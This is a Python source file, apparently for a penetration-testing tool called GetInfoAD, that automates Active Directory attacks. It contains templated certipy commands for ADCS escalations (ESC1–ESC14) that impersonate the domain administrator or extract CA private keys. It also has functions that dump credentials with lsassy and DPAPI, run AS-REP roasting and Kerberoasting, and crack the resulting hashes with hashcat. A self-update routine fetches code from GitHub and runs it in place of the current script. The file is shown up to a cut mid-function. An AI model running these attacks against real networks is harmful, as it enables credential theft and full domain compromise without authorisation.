import pyfiglet
from termcolor import colored
import os
import subprocess
import sys
import argparse
import re
import shutil
import site
from collections import defaultdict
import requests
import hashlib
from pathlib import Path
from datetime import datetime

DEBUG = False

ESC_VULNERABILITIES = {
    "ESC1": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc1",
        "description": "Allows obtaining an authentication certificate by specifying an arbitrary SAN. Exploitation via Certipy: certipy req -u user@domain -p password -target-ip <dc-ip> -ca <ca-name> -template <template-name> -upn administrator@domain.local"
    },
    "ESC2": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc2",
        "description": "Template can be used for any purpose. Similar exploitation to ESC1 but with more certificate usage possibilities. Can be combined with ESC1 for authentication."
    },
    "ESC3": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc3",
        "description": "Certificate Request Agent EKU allows requesting certificates on behalf of other users. Two-step exploitation: 1) Get agent certificate 2) Request certificate as another user. Command: certipy req -u user@domain -p password -target-ip <dc-ip> -ca <ca-name> -template <vulnerable-template> -on-behalf-of administrator@domain.local"
    },
    "ESC4": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc4",
        "description": "Dangerous permissions on template allowing modification to enable vulnerable features. Exploitation: 1) certipy template -u user@domain -p password -template <template-name> -save-old 2) Modify template 3) Request certificate with new permissions"
    },
    "ESC5": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc5",
        "description": "Enrollment Agent restrictions not enforced. Allows requesting certificates for any user without proper authentication. Command: certipy req -u user@domain -p password -target-ip <dc-ip> -ca <ca-name> -template <vulnerable-template> -on-behalf-of administrator@domain.local"
    },
    "ESC6": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc6",
        "description": "Web Enrollment interface allows specifying arbitrary SAN. Note: Patched after May 2022. Exploitation through Web Enrollment interface or certipy req with -web parameter"
    },
    "ESC7": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc7",
        "description": "Dangerous permissions on CA allowing modification of CA settings. Exploitation: certipy ca -u user@domain -p password -ca <ca-name> -enable-template <template-name> or modify other CA settings"
    },
    "ESC8": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc8",
        "description": "Access to CA backup keys allowing private key reconstruction. Command: certipy ca -u user@domain -p password -ca <ca-name> -backup. Can lead to complete CA compromise"
    },
    "ESC9": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc9",
        "description": "Template with no security extension but allows client authentication. Similar to ESC1 exploitation. Command: certipy req -u user@domain -p password -target-ip <dc-ip> -ca <ca-name> -template <vulnerable-template>"
    },
    "ESC10": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc10",
        "description": "Access to archived certificates issued by the CA. Command: certipy ca -u user@domain -p password -ca <ca-name> -issued. Can reveal sensitive certificate information"
    },
    "ESC11": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc11",
        "description": "ICPR requests not required to be encrypted. Possible interception of certificate requests. Can be exploited by capturing unencrypted certificate requests"
    },
    "ESC12": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc12",
        "description": "Misconfigured certificate templates allowing domain escalation. Check for vulnerable configurations like ENROLLEE_SUPPLIES_SUBJECT and dangerous EKUs"
    },
    "ESC13": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc13",
        "description": "SubCA template enabled allowing creation of subordinate CAs. Can lead to complete AD compromise. Command: certipy req -u user@domain -p password -target-ip <dc-ip> -ca <ca-name> -template SubCA"
    },
    "ESC14": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc14",
        "description": "Vulnerable ACL in Parent-Child CA configuration. Can be exploited to compromise child CAs or escalate privileges"
    },
    "ESC15": {
        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc15",
        "description": "Vulnerable template version allowing for template modification attacks. Check for outdated template versions and misconfigurations"
    }
}

AUTOMATED_ESC_EXPLOITS = {
    "ESC1": {
        "can_automate": True,
        "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug",
        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
        "description": "Request a certificate with alternate UPN (SAN). This allows impersonating any user including Domain Admins.",
        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
    },
    "ESC2": {
        "can_automate": True,
        "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug",
        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
        "description": "Template allows any purpose. Similar to ESC1 but with more certificate usage possibilities.",
        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
    },
    "ESC3": {
        "can_automate": True,
        "command": [
            "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -debug -out agent_cert.pfx",
            "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template User -on-behalf-of 'administrator@{domain}' -pfx agent_cert.pfx -debug"
        ],
        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
        "description": "Certificate Request Agent EKU. Two-step exploitation: 1) Get agent certificate 2) Request certificate as another user.",
        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
    },
    "ESC4": {
        "can_automate": True,
        "command": [
            "certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -save-old -debug",
            "certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -configuration '{{template_name}}.json' -save-old -debug",
            "certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -enable-client-auth -debug",
            "certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -upn administrator@{domain} -debug"
        ],
        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
        "description": "Dangerous permissions on template. Steps: 1) Save current config 2) Modify template 3) Request certificate.",
        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
    },
    "ESC5": {
        "can_automate": True,
        "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -on-behalf-of 'administrator@{domain}' -debug",
        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
        "description": "Enrollment Agent restrictions not enforced. Request certificates for any user without proper authentication.",
        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
    },
    "ESC6": {
        "can_automate": True,
        "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -upn administrator@{domain} -debug",
        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "domain"],
        "description": "Web Enrollment interface allows specifying arbitrary SAN. Note: Only works on unpatched systems (before May 2022).",
        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
    },
    "ESC7": {
        "can_automate": True,
        "command": [
            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -enable-template '{template_name}' -debug",
            "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug"
        ],
        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
        "description": "Dangerous permissions on CA. Enable vulnerable template and request certificate.",
        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
    },
    "ESC8": {
        "can_automate": True,
        "command": [
            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -backup -debug",
            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -private-key -pfx '{{ca_name}}.pfx' -password 'Password123!' -debug"
        ],
        "requirements": ["username", "auth_type", "auth_value", "ca_name", "domain"],
        "description": "Access to CA backup keys. Steps: 1) Get CA backup 2) Extract private key.",
        "post_exploit": "# With CA private key you can now sign any certificate"
    },
    "ESC9": {
        "can_automate": True,
        "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug",
        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
        "description": "Template with no security extension but allows client authentication. Similar to ESC1.",
        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
    },
    "ESC10": {
        "can_automate": True,
        "command": [
            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -issued -debug",
            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -issued -id <cert_id> -debug"
        ],
        "requirements": ["username", "auth_type", "auth_value", "ca_name", "domain"],
        "description": "Access to archived certificates. Steps: 1) List issued certs 2) Download specific cert by ID.",
        "post_exploit": "certipy auth -pfx downloaded.pfx -dc-ip {dc_ip}"
    },
    "ESC11": {
        "can_automate": False,
        "description": "ICPR requests not required to be encrypted. Requires network interception, cannot be automated directly.",
        "manual_steps": "Requires setting up a man-in-the-middle position to capture certificate requests."
    },
    "ESC13": {
        "can_automate": True,
        "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template SubCA -upn administrator@{domain} -debug",
        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "domain"],
        "description": "SubCA template enabled. Create a subordinate CA certificate for complete AD compromise.",
        "post_exploit": "# Use the SubCA certificate to sign new certificates"
    },
    "ESC14": {
        "can_automate": True,
        "command": [
            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -list-templates -debug",
            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -enable-template SubCA -debug"
        ],
        "requirements": ["username", "auth_type", "auth_value", "ca_name", "domain"],
        "description": "Vulnerable ACL in Parent-Child CA configuration. Enable SubCA template and create rogue CA.",
        "post_exploit": "# Follow ESC13 steps after enabling SubCA template"
    }
}

def get_current_version():
    """Get hash of current script content"""
    try:
        with open(__file__, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception:
        return None

def get_remote_version():
    """Get latest version from GitHub"""
    try:
        response = requests.get('https://raw.githubusercontent.com/Frozenka/GetInfoAD/main/getinfoAD.py')
        if response.status_code == 200:
            return hashlib.sha256(response.content).hexdigest()
        return None
    except Exception:
        return None

def update_available():
    """Check if an update is available"""
    current = get_current_version()
    remote = get_remote_version()
    return current != remote if current and remote else False

def perform_update():
    """Update the script from GitHub"""
    try:
        response = requests.get('https://raw.githubusercontent.com/Frozenka/GetInfoAD/main/getinfoAD.py')
        if response.status_code == 200:
            backup_path = f"{__file__}.backup"
            shutil.copy2(__file__, backup_path)
            
            try:
                with open(__file__, 'wb') as f:
                    f.write(response.content)
                print(colored("✅ Update successful!", "green"))
                print(colored("🔄 Restarting script...", "cyan"))
                os.execv(sys.executable, ['python3'] + sys.argv)
            except Exception as e:
                shutil.copy2(backup_path, __file__)
                print(colored(f"❌ Update failed, restored backup: {e}", "red"))
                os.remove(backup_path)
                return False
            
            os.remove(backup_path)
            return True
    except Exception as e:
        print(colored(f"❌ Update failed: {e}", "red"))
        return False

def check_for_updates():
    """Check for updates and prompt user"""
    if update_available():
        print(colored("\n🔄 An update is available for GetInfoAD!", "yellow"))
        choice = input(colored("Would you like to update now? [Y/n] > ", "cyan")).strip().lower()
        if choice == '' or choice == 'y':
            perform_update()

def install_termcolor_if_missing():
    try:
        import termcolor
    except ImportError:
        print("[termcolor]: Module missing. Installing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "termcolor"], check=True)
        site.main()  # reload paths

def install_pyfiglet_if_missing():
    try:
        import pyfiglet
    except ImportError:
        print("[pyfiglet]: Module missing. Installing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyfiglet"], check=True)
        site.main()  # reload paths

def install_requests_if_missing():
    try:
        import requests
    except ImportError:
        print("[requests]: Module missing. Installing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "requests"], check=True)
        site.main()  # reload paths

install_termcolor_if_missing()
install_pyfiglet_if_missing()
install_requests_if_missing()

def validate_ip(ip):
    """Validates and processes an IP address that may include a /24 mask"""
    if not ip:
        return None, False
    
    is_network = "/24" in ip
    if is_network:
        base_ip = ip.replace("/24", "")
        try:
            parts = base_ip.split('.')
            if len(parts) != 4:
                return None, False
            for part in parts:
                if not part.isdigit() or not 0 <= int(part) <= 255:
                    return None, False
            return base_ip, True  # Return IP without mask and network indicator
        except:
            return None, False
    else:
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return None, False
            for part in parts:
                if not part.isdigit() or not 0 <= int(part) <= 255:
                    return None, False
            return ip, False
        except:
            return None, False

def check_env_vars():
    env = {}
    for var in ["IP", "USER", "PASSWORD"]:
        value = os.getenv(var)
        if var == "IP":
            value, is_network = validate_ip(value)
            env[var] = value
            env["IS_NETWORK"] = "True" if is_network else "False"
        else:
            env[var] = value
    return env

def show_banner():
    print()
    print(colored("╔══════════════════════════════════════════════════════════════╗", "cyan"))
    figlet = pyfiglet.Figlet(font='slant')
    text_lines = figlet.renderText('GetInfoAD').rstrip().split('\n')
    for line in text_lines:
        print(colored("║", "cyan") + colored(f"{line:^62}", "green") + colored("║", "cyan"))
    print(colored("╠══════════════════════════ V1.0.1 ════════════════════════════╣", "cyan"))
    title = "Active Directory Enumeration"  
    print(colored("║", "cyan") + colored(f"{title:^62}", "blue", attrs=["bold"]) + colored("║", "cyan"))
    print(colored("╠══════════════════════════════════════════════════════════════╣", "cyan"))
    created_by = "  [*] Created by frozenk"
    print(colored("║", "cyan") + colored("  [*] ", "yellow") + colored("Created by", "white") + colored(" frozenk", "blue", attrs=["bold"]) + " " * (62 - len(created_by)) + colored("║", "cyan"))
    powered_by = "  [*] Powered by Exegol"
    print(colored("║", "cyan") + colored("  [*] ", "yellow") + colored("Powered by", "white") + colored(" Exegol", "green", attrs=["bold"]) + " " * (62 - len(powered_by)) + colored("║", "cyan"))
    print(colored("╚══════════════════════════════════════════════════════════════╝", "cyan"))
    print()

def show_domain_info(domain):
    print(colored("╔══════════════════════════════════════════════════════════════╗", "cyan"))
    domain_line = f"  [+] Target Domain: {domain}"
    padding = 62 - len(domain_line)
    print(colored("║", "cyan") + colored(domain_line, "yellow", attrs=["bold"]) + " " * padding + colored("║", "cyan"))
    print(colored("╚══════════════════════════════════════════════════════════════╝", "cyan"))


def banner():
    show_banner()
    domain = get_domain_name()
    show_domain_info(domain)
    return domain

def show_env(env):
    print(colored("🌐 Environment variables:", "yellow", attrs=["bold"]))
    for key, value in env.items():
        if key == "IS_NETWORK":
            continue
        if value:
            if key == "IP":
                display = colored("✅", "green") + colored(f" {key} = ", "white") + colored(value, "cyan", attrs=["bold"])
                if env.get("IS_NETWORK", False) and "/24" in os.getenv("IP", ""):
                    display += colored(" (/24)", "cyan")
            else:
                display = colored("✅", "green") + colored(f" {key} = ", "white") + colored(value, "cyan", attrs=["bold"])
        else:
            if key == "IP":
                display = colored("❌", "red") + colored(f" {key} is not defined or is not a valid IP address", "red")
            elif key == "PASSWORD" and os.getenv("NT_HASH"):
                continue  # Skip PASSWORD error if NT_HASH is defined
            else:
                display = colored("❌", "red") + colored(f" {key} is not defined", "red")
        print("   " + display)
    
    if os.getenv("NT_HASH"):
        print(colored("   🔐 Authentication: Using NT Hash", "green"))
    elif os.getenv("PASSWORD"):
        print(colored("   🔐 Authentication: Using Password", "green"))
    else:
        print(colored("   ❌ No authentication method defined", "red"))
    print()

def generate_network_ips(base_ip):
    """Generates all IP addresses in a /24 network"""
    parts = base_ip.split('.')
    if len(parts) != 4:
        return [base_ip]
    
    network_ips = []
    for i in range(1, 255):  # Exclude .0 and .255
        network_ips.append(f"{parts[0]}.{parts[1]}.{parts[2]}.{i}")
    
    return network_ips

def run_command(command, use_network=False, use_dc=False):
    """Executes a command, with option to use all network IPs or only the DC"""
    try:
        is_network = os.getenv("IS_NETWORK", "False").lower() == "true"
        
        def log_command(cmd, output, error=None):
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open("log.txt", "a") as f:
                f.write(f"\n{'='*80}\n")
                f.write(f"[{timestamp}] Command: {cmd}\n")
                f.write(f"{'='*80}\n")
                if output:
                    f.write("Output:\n")
                    f.write(output)
                    f.write("\n")
                if error:
                    f.write("Error:\n")
                    f.write(error)
                    f.write("\n")
                f.write(f"{'='*80}\n")
        
        auth_type = "H" if os.getenv("NT_HASH") else "p"
        auth_value = os.getenv("NT_HASH") if auth_type == "H" else os.getenv("PASSWORD")
        
        if auth_type == "H" and ":" in auth_value:
            auth_value = auth_value.split(":")[1]
        
        if use_dc and os.getenv("DC_IP"):
            dc_ip = os.getenv("DC_IP")
            current_command = command.replace("$IP", dc_ip)
            if auth_type == "H":
                current_command = current_command.replace("-p $PASSWORD", f"-H {auth_value}")
            else:
                current_command = current_command.replace("$PASSWORD", auth_value)
            if DEBUG:
                print(colored(f"🔍 Command (DC): {current_command}", "yellow"))
            result = subprocess.run(current_command, shell=True, executable="/bin/bash", check=True, capture_output=True, text=True)
            log_command(current_command, result.stdout, result.stderr)
            if DEBUG:
                print(colored("📤 Output:", "yellow"))
                print(result.stdout)
                if result.stderr:
                    print(colored("📤 Error:", "red"))
                    print(result.stderr)
            return result.stdout.strip().splitlines()
        
        elif use_network and is_network:
            base_ip = os.getenv("IP")
            network_ips = generate_network_ips(base_ip)
            all_results = []
            for ip in network_ips:
                current_command = command.replace("$IP", ip)
                if auth_type == "H":
                    current_command = current_command.replace("-p $PASSWORD", f"-H {auth_value}")
                else:
                    current_command = current_command.replace("$PASSWORD", auth_value)
                print(colored(f"▶️  Running on {ip}...", "cyan"))
                if DEBUG:
                    print(colored(f"🔍 Command: {current_command}", "yellow"))
                result = subprocess.run(current_command, shell=True, executable="/bin/bash", check=True, capture_output=True, text=True)
                log_command(current_command, result.stdout, result.stderr)
                if DEBUG:
                    print(colored("📤 Output:", "yellow"))
                    print(result.stdout)
                    if result.stderr:
                        print(colored("📤 Error:", "red"))
                        print(result.stderr)
                all_results.extend(result.stdout.strip().splitlines())
            return all_results
        
        else:
            current_command = command.replace("$IP", os.getenv("IP"))
            if auth_type == "H":
                current_command = current_command.replace("-p $PASSWORD", f"-H {auth_value}")
            else:
                current_command = current_command.replace("$PASSWORD", auth_value)
            if DEBUG:
                print(colored(f"🔍 Command: {current_command}", "yellow"))
            result = subprocess.run(current_command, shell=True, executable="/bin/bash", check=True, capture_output=True, text=True)
            log_command(current_command, result.stdout, result.stderr)
            if DEBUG:
                print(colored("📤 Output:", "yellow"))
                print(result.stdout)
                if result.stderr:
                    print(colored("📤 Error:", "red"))
                    print(result.stderr)
            return result.stdout.strip().splitlines()
            
    except subprocess.CalledProcessError as e:
        error_msg = f"❌ Command failed: {command}\n{e.stderr.strip()}"
        print(colored(error_msg, "red"))
        log_command(command, None, error_msg)
        return []
    except Exception as e:
        error_msg = f"❌ Unexpected error: {str(e)}"
        print(colored(error_msg, "red"))
        return []

def ask_to_save(data, default_name):
    choice = input(colored("\n📂 Do you want to save this list to a file? (y/n) > ", "yellow")).strip().lower()
    if choice == "y":
        filename = input(colored(f"📝 Enter filename (default: {default_name}) > ", "cyan")).strip()
        filename = filename if filename else default_name
        try:
            with open(filename, "w") as f:
                f.write("\n".join(data) + "\n")
            print(colored(f"✅ Successfully saved to: {filename}", "green", attrs=["bold"]))
        except Exception as e:
            print(colored("❌ Error while saving:", "red"), e)
    else:
        print(colored("📬 List not saved.", "yellow"))

def get_machines(with_versions=False):
    command = '''nxc smb $IP -u $USER -p $PASSWORD'''
    lines = run_command(command, use_network=True, use_dc=False)
    hosts = {}
    admin_hosts = []
    admin_results = {}
    
    if not with_versions:
        print(colored("\n🔍 Scanning for machines...", "cyan"))
    
    for line in lines:
        hostname_match = re.search(r'SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(\w+)', line)
        if hostname_match:
            ip = hostname_match.group(1)
            hostname = hostname_match.group(2)
            
            if "(admin)" in line:
                admin_hosts.append((ip, hostname))
                if not with_versions:
                    print(colored("\n" + "="*50, "red"))
                    print(colored(f"🔰 ADMIN ACCESS DETECTED 🔰", "red", attrs=["bold"]))
                    print(colored(f"Target: {hostname} ({ip})", "red"))
                    print(colored("="*50 + "\n", "red"))
            
            if with_versions:
                if "Windows" in line:
                    if "Server" in line:
                        os_info = re.search(r'Windows Server (\d{4})', line)
                        if os_info:
                            hosts[hostname] = f"Windows Server {os_info.group(1)}"
                        else:
                            hosts[hostname] = "Windows Server"
                    else:
                        os_info = re.search(r'Windows (\d+)', line)
                        if os_info:
                            hosts[hostname] = f"Windows {os_info.group(1)}"
                        else:
                            hosts[hostname] = "Windows"
                elif "Unix" in line or "Samba" in line:
                    hosts[hostname] = "Unix/Linux"
                else:
                    hosts[hostname] = "Unknown OS"
            else:
                hosts[hostname] = None
    
    if with_versions:
        ldap_command = '''nxc ldap $IP -u $USER -p $PASSWORD --groups'''
        ldap_lines = run_command(ldap_command, use_network=False, use_dc=True)
        for line in ldap_lines:
            if "Windows" in line:
                os_match = re.search(r'Windows (?:10|Server \d{4})', line)
                if os_match:
                    hostname = line.split('(name:')[1].split(')')[0]
                    if hostname not in hosts or hosts[hostname] == "Unknown OS":
                        hosts[hostname] = os_match.group(0)
    
    if admin_hosts and not with_versions:
        print(colored(f"\n🎯 Found {len(admin_hosts)} host(s) with admin access.", "yellow"))
        
        for admin_ip, hostname in admin_hosts:
            print(colored(f"\n{'='*50}", "cyan"))
            print(colored(f"🔍 Target: {hostname} ({admin_ip})", "cyan", attrs=["bold"]))
            print(colored(f"{'='*50}", "cyan"))
            
            admin_results[hostname] = {"ip": admin_ip, "lsassy": [], "dpapi": []}
            
             
            choice = input(colored("\n🔍 Do you want try dump password on this host? (y/N) > ", "yellow")).strip().lower()
            if choice != 'y':
                continue
            
            print(colored("\n📊 Running dump...", "yellow"))
            lsassy_command = f'''nxc smb {admin_ip} -u $USER -p $PASSWORD -M lsassy'''
            lsassy_results = run_command(lsassy_command)
            
            found_creds = False
            for line in lsassy_results:
                if "LSASSY" in line and not any(x in line for x in ["[*]", "[+]"]):
                    found_creds = True
                    print(colored(f"  {line}", "green"))
                    admin_results[hostname]["lsassy"].append(line.strip())
            
            if not found_creds:
                print(colored("  ℹ️  No credentials found ", "yellow"))
            
            print(colored("\n🔐 Running dump ...", "yellow"))
            dpapi_command = f'''nxc smb {admin_ip} -u $USER -p $PASSWORD --dpapi'''
            dpapi_results = run_command(dpapi_command)
            
            found_dpapi = False
            for line in dpapi_results:
                if "[SYSTEM][CREDENTIAL]" in line:
                    found_dpapi = True
                    print(colored(f"  {line}", "green"))
                    admin_results[hostname]["dpapi"].append(line.strip())
            
            if not found_dpapi:
                print(colored("  ℹ️  No DPAPI credentials found", "yellow"))
            
            print(colored(f"\n{'='*50}", "cyan"))
    
    return hosts, admin_results

def get_groups():
    command = '''nxc ldap $IP -u $USER -p $PASSWORD --groups'''
    lines = run_command(command, use_network=False, use_dc=True)
    groups = []
    for line in lines:
        match = re.search(r'\s+DC01\s+(.*?)\s+membercount', line)
        if match:
            group = match.group(1).strip()
            if group:
                groups.append(group)
    return sorted(set(groups))

def get_loggedon_users():
    command = '''nxc smb $IP -u $USER -p $PASSWORD --loggedon-users'''
    lines = run_command(command, use_network=False, use_dc=True)  # On utilise uniquement le DC
    sessions = defaultdict(lambda: {"ip": "", "users": []})
    
    for line in lines:
        match_host = re.match(r'^SMB\s+(\S+)\s+\d+\s+(\S+)', line)
        if match_host:
            ip = match_host.group(1)
            host = match_host.group(2)
            sessions[host]["ip"] = ip
            continue
            
        user_patterns = [
            r'(\\\\|\s)([\w.-]+\\[\w.-]+)\s+logon_server',  # DOMAIN\user
            r'([\w.-]+@[\w.-]+)\s+logon_server',  # user@domain
            r'\[\*\] User:\s+([\w.-]+\\[\w.-]+)',  # [*] User: DOMAIN\user
            r'\[\*\] User:\s+([\w.-]+@[\w.-]+)'  # [*] User: user@domain
        ]
        
        for pattern in user_patterns:
            match_user = re.search(pattern, line)
            if match_user:
                user = match_user.group(1) if "\\" in match_user.group(1) else match_user.group(2)
                host_match = re.search(r'SMB\s+\S+\s+\d+\s+(\S+)', line)
                if host_match:
                    host = host_match.group(1)
                if user not in sessions[host]["users"]:
                    sessions[host]["users"].append(user)
                    break
    
    if not sessions:
        print(colored("⚠️ No logged-on users found or access denied", "yellow"))
    
    return dict(sessions)

def get_interfaces():
    command = '''nxc smb $IP -u $USER -p $PASSWORD --interfaces'''
    lines = run_command(command, use_network=True, use_dc=False)  # On utilise toutes les cibles
    parsed = []
    seen = set()
    for line in lines:
        match = re.search(r'(Ethernet\d+)\s+\|\s+([\d.]+)\s+\|\s+(.*?)\s+\|\s+(.*?)\s+\|\s+(True|False)', line)
        if match:
            host_match = re.search(r'SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(\S+)', line)
            if host_match:
                host = host_match.group(2)
                entry = f"{host} - {match.group(1)} - {match.group(2)}  | Mask: {match.group(3)}  | Gateway: {match.group(4)}  | DHCP: {match.group(5)}"
                if entry not in seen:
                    parsed.append(entry)
                    seen.add(entry)
    return parsed

def get_passpol():
    command = '''nxc smb $IP -u $USER -p $PASSWORD --pass-pol'''
    lines = run_command(command, use_network=False, use_dc=True)
    filtered = []
    seen = set()
    for line in lines:
        clean = re.sub(r'^SMB\s+\S+\s+\d+\s+\S+\s+', '', line).strip()
        if clean.startswith("[+]"):
            continue
        if any(keyword in clean.lower() for keyword in ["password", "lockout", "complex", "minimum", "maximum", "reset", "threshold"]):
            if clean not in seen:
                filtered.append(clean)
                seen.add(clean)
    return filtered

def get_domain_name():
    command = '''nxc smb $IP -u $USER -p $PASSWORD'''
    result = run_command(command, use_network=True)  # On all network IPs to find DC
    domain = "UnknownDomain.local"
    dc_ips = []
    dc_hostnames = []
    
    for line in result:
        if "(domain:" in line and "DC" in line.upper():
            match_domain = re.search(r'\(domain:([^)]+)\)', line)
            if match_domain:
                domain = match_domain.group(1).strip()
                if domain:  # Ne pas utiliser un domaine vide
                    match_dc = re.search(r'SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(\S+)', line)
                    if match_dc:
                        dc_ip = match_dc.group(1)
                        dc_hostname = match_dc.group(2)
                        if dc_ip not in dc_ips:  # Éviter les doublons
                            dc_ips.append(dc_ip)
                            dc_hostnames.append(dc_hostname)
                            os.environ["DC_IP"] = dc_ip
                            if DEBUG:
                                print(colored(f"🔍 DC detected at IP address: {dc_ip}", "green"))
                            break  # On prend le premier DC valide trouvé
    
    if not dc_ips:  # Si aucun DC n'a été trouvé
        os.environ["DC_IP"] = os.getenv("IP")
        if DEBUG:
            print(colored(f"⚠️  No DC found, using provided IP: {os.getenv('IP')}", "yellow"))
    
    return domain

def get_asreproast(users):
    users_file = "userdomaine.txt"
    output_file = "asreproast_output.txt"

    try:
        with open(users_file, "w") as f:
            f.write("\n".join(users) + "\n")
    except Exception as e:
        print(colored("❌ Failed to write user list:", "red"), e)
        return []

    command = f"nxc ldap $IP -u {users_file} -p '' --asreproast {output_file}"
    run_command(command, use_network=False, use_dc=True)

    if not os.path.exists(output_file) or os.path.getsize(output_file) == 0:
        print(colored("❌ AS-REP empty.", "red"))
        return []

    try:
        with open(output_file, "r") as f:
            hashes = set(line.strip() for line in f if "$krb5asrep$" in line)
        with open(output_file, "w") as f:
            for h in sorted(hashes):
                f.write(h + "\n")
        return sorted(hashes)
    except Exception as e:
        print(colored("❌ Failed to process AS-REP hashes:", "red"), e)
        return []

def get_kerberost():
    output_file = "kerberost.txt"

    command = f"nxc ldap $IP -u $USER -p $PASSWORD --kerberoasting {output_file}"
    run_command(command, use_network=False, use_dc=True)

    if not os.path.exists(output_file) or os.path.getsize(output_file) == 0:
        print(colored("❌ Kerberos Roasting empty.", "red"))
        return []

    try:
        with open(output_file, "r") as f:
            hashes = set(line.strip() for line in f if "$krb5tgs$" in line)
        with open(output_file, "w") as f:
            for h in sorted(hashes):
                f.write(h + "\n")
        return sorted(hashes)
    except Exception as e:
        print(colored("❌ Failed to process Kerberos hashes:", "red"), e)
        return []

def ask_crack_kerberos_hashes():
    print()
    choice = input(colored("🧨 Do you want to try to crack Kerberos hashes now ? (y/n) > ", "yellow")).strip().lower()
    if choice != "y":
        print(colored("🚫 Skipping hash cracking.", "yellow"))
        return

    print(colored("📂 Select your wordlist...", "cyan"))
    try:
        wordlist_cmd = "find /opt/lists /usr/share/wordlists /usr/share/wfuzz /usr/share/dirb -type f | fzf"
        wordlist = subprocess.check_output(wordlist_cmd, shell=True, text=True).strip()

        if not wordlist:
            print(colored("❌ No wordlist selected (fzf exited).", "red"))
            return

    except subprocess.CalledProcessError:
        print(colored("❌ Failed to launch fzf-wordlists.", "red"))
        return

    hashfile = "kerberost.txt"
    if not os.path.isfile(hashfile):
        print(colored(f"❌ Hash file not found: {hashfile}", "red"))
        return

    print(colored(f"🚀 Launching hashcat on {hashfile} using {wordlist}...", "magenta"))
    potfile = "hashcat.potfile"

    command = f"hashcat {os.path.abspath(hashfile)} {os.path.abspath(wordlist)} --quiet --force --potfile-path {os.path.abspath(potfile)}"

    try:
